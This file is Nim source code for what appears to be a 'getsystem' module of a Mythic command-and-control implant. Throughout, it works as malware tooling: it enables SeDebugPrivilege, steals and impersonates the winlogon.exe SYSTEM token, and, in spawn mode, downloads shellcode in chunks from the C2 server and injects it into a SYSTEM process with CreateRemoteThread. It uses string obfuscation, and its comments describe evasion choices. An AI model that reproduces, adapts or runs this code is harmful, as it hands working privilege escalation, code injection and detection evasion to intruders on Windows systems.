import ../utils/m_responses
import ../utils/debug
import ../utils/strenc
import std/[json, strformat, strutils, base64]
import token_manager

when defined(windows):
  import winim/lean
  
  const
    TH32CS_SNAPPROCESS = 0x00000002
    TOKEN_ADJUST_PRIVILEGES = 0x0020
    TOKEN_QUERY = 0x0008
    SE_PRIVILEGE_ENABLED = 0x00000002
    
  type
    PROCESSENTRY32W = object
      dwSize: DWORD
      cntUsage: DWORD
      th32ProcessID: DWORD
      th32DefaultHeapID: ULONG_PTR
      th32ModuleID: DWORD
      cntThreads: DWORD
      th32ParentProcessID: DWORD
      pcPriClassBase: LONG
      dwFlags: DWORD
      szExeFile: array[260, WCHAR]
    
    LUID = object
      LowPart: DWORD
      HighPart: LONG
    
    LUID_AND_ATTRIBUTES = object
      Luid: LUID
      Attributes: DWORD
    
    TOKEN_PRIVILEGES = object
      PrivilegeCount: DWORD
      Privileges: array[1, LUID_AND_ATTRIBUTES]
    
    SECURITY_IMPERSONATION_LEVEL = enum
      SecurityAnonymous = 0
      SecurityIdentification = 1
      SecurityImpersonation = 2
      SecurityDelegation = 3
    
    TOKEN_TYPE = enum
      TokenPrimary = 1
      TokenImpersonation = 2

  # Windows API imports
  proc CreateToolhelp32Snapshot(dwFlags: DWORD, th32ProcessID: DWORD): HANDLE 
    {.importc, dynlib: obf("kernel32.dll"), stdcall.}
  
  proc Process32FirstW(hSnapshot: HANDLE, lppe: ptr PROCESSENTRY32W): WINBOOL 
    {.importc, dynlib: obf("kernel32.dll"), stdcall.}
  
  proc Process32NextW(hSnapshot: HANDLE, lppe: ptr PROCESSENTRY32W): WINBOOL 
    {.importc, dynlib: obf("kernel32.dll"), stdcall.}
  
  proc LookupPrivilegeValueW(lpSystemName: LPCWSTR, lpName: LPCWSTR, lpLuid: ptr LUID): WINBOOL 
    {.importc, dynlib: obf("advapi32.dll"), stdcall.}
  
  proc AdjustTokenPrivileges(TokenHandle: HANDLE, DisableAllPrivileges: WINBOOL, 
                             NewState: ptr TOKEN_PRIVILEGES, BufferLength: DWORD,
                             PreviousState: ptr TOKEN_PRIVILEGES, ReturnLength: ptr DWORD): WINBOOL 
    {.importc, dynlib: obf("advapi32.dll"), stdcall.}
  
  proc DuplicateTokenEx(hExistingToken: HANDLE, dwDesiredAccess: DWORD,
                        lpTokenAttributes: LPSECURITY_ATTRIBUTES,
                        ImpersonationLevel: SECURITY_IMPERSONATION_LEVEL,
                        TokenType: TOKEN_TYPE, phNewToken: ptr HANDLE): WINBOOL 
    {.importc, dynlib: obf("advapi32.dll"), stdcall.}
  
  proc ImpersonateLoggedOnUser(hToken: HANDLE): WINBOOL 
    {.importc, dynlib: obf("advapi32.dll"), stdcall.}

  proc enableSeDebugPrivilege() =
    ## Enable SeDebugPrivilege on the current process token
    var hToken: HANDLE = 0
    if OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES or TOKEN_QUERY, addr hToken) != 0:
      debug "[DEBUG] GetSystem: Opened current process token"
      
      var luid: LUID
      let privName = newWideCString("SeDebugPrivilege")
      if LookupPrivilegeValueW(nil, privName, addr luid) != 0:
        debug "[DEBUG] GetSystem: Looked up SeDebugPrivilege"
        
        var tp = TOKEN_PRIVILEGES(
          PrivilegeCount: 1,
          Privileges: [LUID_AND_ATTRIBUTES(Luid: luid, Attributes: SE_PRIVILEGE_ENABLED)]
        )
        
        discard AdjustTokenPrivileges(hToken, 0, addr tp, DWORD(sizeof(TOKEN_PRIVILEGES)), nil, nil)
        debug "[DEBUG] GetSystem: Adjusted token privileges"
      
      CloseHandle(hToken)

  proc findProcessPid(name: string): DWORD =
    ## Find the PID of a process by name
    let snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
    if snapshot == INVALID_HANDLE_VALUE:
      return 0
    
    var processEntry: PROCESSENTRY32W
    processEntry.dwSize = DWORD(sizeof(PROCESSENTRY32W))
    
    result = 0
    let searchName = name.toLowerAscii()
    
    if Process32FirstW(snapshot, addr processEntry) != 0:
      while true:
        let processName = $cast[WideCString](addr processEntry.szExeFile[0])
        if processName.toLowerAscii().contains(searchName):
          result = processEntry.th32ProcessID
          debug &"[DEBUG] GetSystem: Found {processName} with PID {result}"
          break
        
        if Process32NextW(snapshot, addr processEntry) == 0:
          break
    
    CloseHandle(snapshot)

  proc findWinlogonPid(): DWORD =
    ## Find the PID of winlogon.exe
    result = findProcessPid(obf("winlogon"))

  proc duplicateSystemToken(winlogonPid: DWORD): tuple[success: bool, token: HANDLE, error: string] =
    ## Open winlogon and duplicate its token
    let processHandle = OpenProcess(MAXIMUM_ALLOWED, 0, winlogonPid)
    if processHandle == 0:
      let err = GetLastError()
      return (false, 0.HANDLE, obf("Failed to open winlogon process: ") & $err)
    
    debug "[DEBUG] GetSystem: Opened winlogon process"
    
    var tokenHandle: HANDLE = 0
    if OpenProcessToken(processHandle, MAXIMUM_ALLOWED, addr tokenHandle) == 0:
      let err = GetLastError()
      CloseHandle(processHandle)
      return (false, 0.HANDLE, obf("Failed to open winlogon token: ") & $err)
    
    debug "[DEBUG] GetSystem: Opened winlogon token"
    
    var duplicatedToken: HANDLE = 0
    if DuplicateTokenEx(
      tokenHandle,
      MAXIMUM_ALLOWED,
      nil,
      SecurityImpersonation,
      TokenImpersonation,
      addr duplicatedToken
    ) == 0:
      let err = GetLastError()
      CloseHandle(tokenHandle)
      CloseHandle(processHandle)
      return (false, 0.HANDLE, obf("Failed to duplicate token: ") & $err)
    
    debug "[DEBUG] GetSystem: Duplicated token"
    
    CloseHandle(tokenHandle)
    CloseHandle(processHandle)
    return (true, duplicatedToken, "")

  proc injectIntoSystemProcess(pid: DWORD, shellcode: seq[byte]): tuple[success: bool, error: string] =
    ## Inject shellcode directly into an existing SYSTEM process via CreateRemoteThread.
    ## Uses DuplicateHandle technique: open with PROCESS_DUP_HANDLE (less suspicious),
    ## then duplicate the target's own handle into our process for full access.
    let hTarget = OpenProcess(PROCESS_DUP_HANDLE, 0, pid)
    if hTarget == 0:
      return (false, obf("Failed to open SYSTEM process: ") & $GetLastError())
    
    var hDup: HANDLE = 0
    if DuplicateHandle(hTarget, GetCurrentProcess(), GetCurrentProcess(),
                       addr hDup, 0, 0, DUPLICATE_SAME_ACCESS) == 0:
      CloseHandle(hTarget)
      return (false, obf("DuplicateHandle failed: ") & $GetLastError())
    CloseHandle(hTarget)
    
    # Allocate RW memory (not RWX - better OPSEC)
    let pRemote = VirtualAllocEx(hDup, nil, SIZE_T(shellcode.len),
                                  MEM_COMMIT or MEM_RESERVE, PAGE_READWRITE)
    if pRemote == nil:
      CloseHandle(hDup)
      return (false, obf("VirtualAllocEx failed: ") & $GetLastError())
    
    var bytesWritten: SIZE_T
    if WriteProcessMemory(hDup, pRemote, unsafeAddr shellcode[0],
                          SIZE_T(shellcode.len), addr bytesWritten) == 0:
      CloseHandle(hDup)
      return (false, obf("WriteProcessMemory failed: ") & $GetLastError())
    
    # Transition RW -> RX (no RWX pages)
    var oldProtect: DWORD
    if VirtualProtectEx(hDup, pRemote, SIZE_T(shellcode.len),
                        PAGE_EXECUTE_READ, addr oldProtect) == 0:
      CloseHandle(hDup)
      return (false, obf("VirtualProtectEx failed: ") & $GetLastError())
    
    var threadId: DWORD
    let hThread = CreateRemoteThread(hDup, nil, 0,
                                      cast[LPTHREAD_START_ROUTINE](pRemote),
                                      nil, 0, addr threadId)
    if hThread == 0:
      CloseHandle(hDup)
      return (false, obf("CreateRemoteThread failed: ") & $GetLastError())
    CloseHandle(hThread)
    
    CloseHandle(hDup)
    return (true, "")

type
  GetSystemArgs = object
    uuid: string
    target: string

proc getsystem*(taskId: string, params: JsonNode): JsonNode =
  ## Elevate to SYSTEM by duplicating winlogon.exe token.
  ## If uuid is provided, spawns a new callback as SYSTEM.
  ## Otherwise, impersonates SYSTEM in the current callback.
  when defined(windows):
    try:
      debug "[DEBUG] GetSystem: Starting elevation process"
      
      # Check if this is a spawn request (uuid present)
      let hasUuid = params.hasKey(obf("uuid")) and params[obf("uuid")].getStr().len > 0
      
      if hasUuid:
        # Spawn mode: request payload download, then inject into SYSTEM process
        let args = to(params, GetSystemArgs)
        debug &"[DEBUG] GetSystem spawn mode: uuid={args.uuid}"
        
        # Enable SeDebugPrivilege first
        enableSeDebugPrivilege()
        
        # Return initial response to request the payload file from Mythic
        return %*{
          obf("task_id"): taskId,
          obf("upload"): {
            obf("file_id"): args.uuid,
            obf("chunk_num"): 1,
            obf("chunk_size"): 512000,
            obf("full_path"): ""
          }
        }
      else:
        # Impersonate mode: existing behavior
        let oldUser = getCurrentUsername()
        debug &"[DEBUG] GetSystem: Current user: {oldUser}"
        
        enableSeDebugPrivilege()
        
        let winlogonPid = findWinlogonPid()
        if winlogonPid == 0:
          return mythicError(taskId, obf("Failed to find winlogon.exe process"))
        
        let (success, duplicatedToken, error) = duplicateSystemToken(winlogonPid)
        if not success:
          return mythicError(taskId, error)
        
        # Impersonate the SYSTEM token
        if ImpersonateLoggedOnUser(duplicatedToken) == 0:
          let err = GetLastError()
          CloseHandle(duplicatedToken)
          return mythicError(taskId, obf("Failed to impersonate SYSTEM token: ") & $err)
        
        debug "[DEBUG] GetSystem: Impersonated SYSTEM token"
        
        setTokenHandle(duplicatedToken)
        
        let newUser = obf("NT AUTHORITY\\SYSTEM")
        debug &"[DEBUG] GetSystem: New user: {newUser}"
        
        let output = obf("Successfully elevated from ") & oldUser & " to " & newUser
        
        return mythicCallback(taskId, output, %*{
          obf("impersonation_context"): newUser
        })
      
    except Exception as e:
      return mythicError(taskId, obf("GetSystem error: ") & e.msg)
  else:
    return mythicError(taskId, obf("getsystem command is only available on Windows"))

proc executeGetSystem*(taskId: string, shellcode: seq[byte], params: JsonNode): JsonNode

proc processGetSystemChunk*(taskId: string, params: JsonNode, chunkData: string,
                            totalChunks: int, currentChunk: int,
                            fileData: var seq[byte]): JsonNode =
  ## Process a chunk of the payload file being downloaded for getsystem spawn
  when defined(windows):
    try:
      let args = to(params, GetSystemArgs)
      
      let decodedChunk = decode(chunkData)
      for b in decodedChunk:
        fileData.add(cast[byte](b))
      
      debug &"[DEBUG] GetSystem spawn: Received chunk {currentChunk}/{totalChunks}, accumulated {fileData.len} bytes"
      
      if currentChunk < totalChunks:
        return %*{
          obf("task_id"): taskId,
          obf("upload"): {
            obf("chunk_size"): 512000,
            obf("file_id"): args.uuid,
            obf("chunk_num"): currentChunk + 1,
            obf("full_path"): ""
          }
        }
      
      return executeGetSystem(taskId, fileData, params)
      
    except Exception as e:
      return mythicError(taskId, obf("GetSystem chunk processing error: ") & e.msg)
  else:
    return mythicError(taskId, obf("getsystem command is only available on Windows"))

proc executeGetSystem*(taskId: string, shellcode: seq[byte], params: JsonNode): JsonNode =
  ## Execute the getsystem spawn after download is complete.
  ## Injects directly into an existing SYSTEM process.
  when defined(windows):
    try:
      if shellcode.len == 0:
        return mythicError(taskId, obf("Shellcode is empty - file download may have failed"))
      
      let args = to(params, GetSystemArgs)
      let target = if args.target.len > 0: args.target else: obf("winlogon.exe")
      let searchName = if target.endsWith(obf(".exe")): target[0 ..< target.len - 4] else: target
      
      let targetPid = findProcessPid(searchName)
      if targetPid == 0:
        return mythicError(taskId, obf("Failed to find ") & target & obf(" process"))
      
      debug &"[DEBUG] GetSystem spawn: Injecting {shellcode.len} bytes into {target} (PID {targetPid})"
      
      let (success, error) = injectIntoSystemProcess(targetPid, shellcode)
      if not success:
        return mythicError(taskId, error)
      
      return mythicSuccess(taskId, obf("GetSystem spawn: injection into ") & target &
                           obf(" (PID: ") & $targetPid & obf(") successful"))
      
    except Exception as e:
      return mythicError(taskId, obf("GetSystem spawn execution error: ") & e.msg)
  else:
    return mythicError(taskId, obf("getsystem command is only available on Windows"))